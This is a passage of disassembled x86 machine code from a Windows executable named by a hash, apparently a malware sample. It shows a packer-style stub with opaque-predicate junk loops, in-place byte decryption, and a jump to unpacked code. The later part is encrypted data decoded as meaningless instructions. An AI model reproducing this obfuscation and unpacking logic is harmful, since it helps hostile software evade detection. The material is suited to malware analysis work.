
7ef856b0fed12f99cd8ef1b742d006f7c8fb7c995d9f735b420e8737f8df4b70.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	pop    es
  4018d8:	sub    edi,ebx
  4018da:	repz add DWORD PTR [ebx+0x5e4b8383],0xffffff83
  4018e2:	sub    DWORD PTR [eax],0x31
  4018e5:	es cmp al,0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	mov    bh,0x71
  4018f1:	jo     0x401966
  4018f3:	jo     0x401940
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	sbb    BYTE PTR [ebx+0x4cedff92],bh
  40198c:	inc    ebp
  40198d:	call   0xdd75:0x489adbd3
  401994:	or     edi,DWORD PTR [ecx+0x49]
  401997:	fs repnz xchg ebx,eax
  40199a:	and    bl,ah
  40199c:	sbb    bh,BYTE PTR ss:[edx-0x5e]
  4019a0:	mov    ecx,0x860f1f73
  4019a5:	rcl    BYTE PTR [esi],0x8
  4019a8:	shr    BYTE PTR [eax-0x3e],0x21
  4019ac:	xchg   ebx,eax
  4019ad:	mov    edi,0x23bc5401
  4019b2:	jnp    0x401979
  4019b4:	call   0x8e2b:0xefa8239
  4019bb:	fisttp WORD PTR [esi]
  4019bd:	cmp    cl,bh
  4019bf:	mov    bl,0xc1
  4019c1:	jmp    0xc678c610
  4019c6:	ja     0x4019e1
  4019c8:	sub    al,0x66
  4019ca:	leave  
  4019cb:	scas   al,BYTE PTR es:[edi]
  4019cc:	out    0x4b,eax
  4019ce:	cmp    BYTE PTR [edx+eax*1-0x642520df],ch
  4019d5:	test   al,0x97
  4019d7:	xor    ah,ch
  4019d9:	dec    esp
  4019da:	out    0x2b,al
  4019dc:	mov    dl,BYTE PTR [esi-0x2a]
  4019df:	cmp    DWORD PTR [esi+0x6],esi
  4019e2:	inc    ebx
  4019e3:	iret   
  4019e4:	add    BYTE PTR [ebp-0x6c],bh
  4019e7:	mov    al,0xad
  4019e9:	cmp    ebx,DWORD PTR [eax-0x2b09f4f5]
  4019ef:	sub    eax,0xd524136e
  4019f4:	leave  
  4019f5:	dec    eax
  4019f6:	or     DWORD PTR [ebx],esp
  4019f8:	xchg   ebx,eax
  4019f9:	stos   DWORD PTR es:[edi],eax
  4019fa:	adc    BYTE PTR [ebx-0x6a],ah
  4019fd:	sbb    eax,0x4f42fe71
  401a02:	pushf  
  401a03:	test   BYTE PTR [esi+0x4f08a9ad],bh
  401a09:	in     eax,0xf9
  401a0b:	and    al,0x64
  401a0d:	jmp    0x76551a47
  401a12:	cmp    DWORD PTR [ebp-0x3699f670],ecx
  401a18:	add    ebp,DWORD PTR [edx]
  401a1a:	jb     0x4019bf
  401a1c:	sbb    WORD PTR [di],0x6eb
  401a22:	or     DWORD PTR [eax+0xffe87fd],ecx
  401a28:	mov    edx,0xe22ebd7c
  401a2d:	in     eax,0x5f
  401a2f:	jns    0x401a86
  401a31:	push   ebp
  401a32:	jmp    0xbae45316
  401a37:	inc    ecx
  401a38:	mov    dh,0x63
  401a3a:	add    eax,0x8e2e003
  401a3f:	imul   bl
  401a41:	outs   dx,BYTE PTR ds:[esi]
  401a42:	push   edi
  401a43:	xlat   BYTE PTR ds:[ebx]
  401a44:	dec    ebp
  401a45:	cld    
  401a46:	int3   
  401a47:	fwait
  401a48:	cmp    DWORD PTR [edi],esi
  401a4a:	dec    ecx
  401a4b:	add    DWORD PTR [edi],esi
  401a4d:	fild   DWORD PTR [eax]
  401a4f:	addr16 int3 
  401a51:	add    BYTE PTR [ecx-0xd],bh
  401a54:	mov    esi,0x9533d633
  401a59:	inc    esp
  401a5a:	fidivr DWORD PTR [edi+0x5e]
  401a5d:	aas    
  401a5e:	pop    es
  401a5f:	daa    
  401a60:	div    BYTE PTR [ebx+eiz*8]
  401a63:	mov    ah,0xdb
  401a65:	jb     0x401a0f
  401a67:	mov    ecx,0x8897f37b
  401a6c:	and    BYTE PTR [ebp-0x68],cl
  401a6f:	int    0xdc
  401a71:	inc    esi
  401a72:	adc    al,0x91
  401a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a75:	fnstenv ds:0x28ec9e88
  401a7b:	cmp    bh,BYTE PTR [esi+eiz*2]
  401a7e:	dec    ecx
  401a7f:	rcl    ebx,1
  401a81:	inc    esp
  401a82:	mov    bh,0xd0
  401a84:	cmp    eax,0x6bc11e9
  401a89:	push   ecx
  401a8a:	mov    bl,0x1f
  401a8c:	xchg   ebx,eax
  401a8d:	sub    DWORD PTR [eax],ebx
  401a8f:	xlat   BYTE PTR ds:[ebx]
  401a90:	or     al,0x6f
  401a92:	idiv   DWORD PTR [edx-0x51]
  401a95:	mov    ?,eax
  401a97:	adc    BYTE PTR [edi+ebp*8+0x50],ah
  401a9b:	scas   eax,DWORD PTR es:[edi]
  401a9c:	mov    ds:0x838730c3,al
  401aa1:	scas   eax,DWORD PTR es:[edi]
  401aa2:	lods   al,BYTE PTR ds:[esi]
  401aa3:	xor    ch,BYTE PTR [ecx]
  401aa5:	inc    edi
  401aa6:	js     0x401ab5
  401aa8:	repz pop eax
  401aaa:	shl    BYTE PTR [edx],1
  401aac:	push   ss
  401aad:	xor    al,0x38
  401aaf:	sti    
  401ab0:	or     DWORD PTR [edi],0xffffffac
  401ab3:	jle    0x401a8a
  401ab5:	mov    eax,0xedc877f8
  401aba:	add    BYTE PTR [ebp-0x75966423],dl
  401ac0:	mov    ds:0x1113ae61,al
  401ac5:	push   esp
  401ac6:	xor    ah,dh
  401ac8:	int3   
  401ac9:	repz add BYTE PTR [edi+0x364d2d14],dl
  401ad0:	cs inc esp
  401ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad3:	scas   eax,DWORD PTR es:[edi]
  401ad4:	out    0xec,eax
  401ad6:	ret    
  401ad7:	hlt    
  401ad8:	mov    ebp,0x63cea3f4
  401add:	js     0x401ab5
  401adf:	jns    0x401b3f
  401ae1:	call   0x3219:0xb15287a6
  401ae8:	call   0x62b2:0xd6434b40
  401aef:	sti    
  401af0:	mov    ecx,DWORD PTR [esi+0x3b]
  401af3:	sub    DWORD PTR [eax-0x407b2dab],esi
  401af9:	imul   ecx,ebp,0xc64590f4
  401aff:	mov    dh,0xc7
  401b01:	adc    esi,DWORD PTR [edi-0x7d]
  401b04:	sbb    al,ah
  401b06:	xchg   ecx,eax
  401b07:	cmp    eax,0xb3d97117
  401b0c:	outs   dx,DWORD PTR ds:[esi]
  401b0d:	jmp    0x6048a914
  401b12:	adc    DWORD PTR [ebx-0x410d729f],ebp
  401b18:	std    
  401b19:	imul   ebx,DWORD PTR [esi-0x6ef61c3a],0xffffffec
